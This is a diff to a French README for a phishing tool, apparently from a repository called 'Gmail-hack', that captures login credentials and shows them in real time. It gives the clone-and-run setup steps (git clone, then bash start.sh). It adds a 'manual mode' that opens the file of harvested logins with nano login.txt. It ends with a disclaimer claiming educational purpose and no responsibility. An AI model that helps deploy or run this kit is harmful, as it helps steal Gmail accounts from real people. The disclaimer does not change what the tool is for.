@@ -11,13 +11,16 @@ Outil de phishing avancé avec affichage en temps réel des identifiants captur�
 
 1. **Mettre à jour les paquets** :
    ```bash
-   pkg update && pkg upgrade -y
    pip install git
    git clone https://github.com/Samsmis01/Gmail-hack.git
    cd Gmail-hack
    bash start.sh
 
-  ⚠️ NB:CECI EST DANS LE CADRE ÉDUCATIF, EN CAS D'UTILISATION
+  vous pouvez voir le données manuellement en exécutant cette commande
+  ## mode manuel
+  nano login.txt
+  
+⚠️ NB:CECI EST DANS LE CADRE ÉDUCATIF, EN CAS D'UTILISATION
   CONTRAIRE A L'ÉTHIQUE NOUS NE SOMMES PAS RESPONSABLE DE VOS
   ACTES.
 HEXTECH 🇨🇩
